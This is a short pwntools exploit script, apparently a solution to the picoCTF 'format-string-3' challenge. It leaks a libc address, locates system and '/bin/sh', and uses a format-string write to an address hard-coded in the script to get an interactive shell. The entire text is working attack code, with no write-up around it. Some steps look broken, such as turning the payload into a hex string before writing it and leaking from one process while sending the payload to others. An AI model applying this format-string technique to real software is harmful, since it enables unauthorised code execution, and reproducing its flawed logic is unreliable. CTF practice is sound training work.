from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

local = True
host = 'rhea.picoctf.net'
port = 62316

context.binary = ELF('./format-string-3')
libc = ELF('./libc.so.6')


if local:
    io = process('./format-string-3')
else: 
    io = remote(host, port)
    
io.recvuntil(b':')
setvbuf_addr = int(io.recv().strip().decode(), 16)
libc.address = setvbuf_addr - libc.sym['setvbuf']

system = libc.sym['system']          # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

pwn_payload = p64(system) + p64(0x0) + p64(binsh) 
# Override #0x7ffff7e36250
def exec_fmt(payload):
    if local:
        io = process('./format-string-3')
    else: 
        io = remote(host, port)
    io.sendline(payload)
    return io.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(f"Offset {offset}")
pwn_payload_int = int.from_bytes(pwn_payload, byteorder='little') 
pwn_payload = hex(pwn_payload_int)
print(f"PWN: {pwn_payload}")
payload = fmtstr_payload(offset, {0x7ffff7e36250: pwn_payload})
print(payload)
io.sendline(payload)
io.interactive()










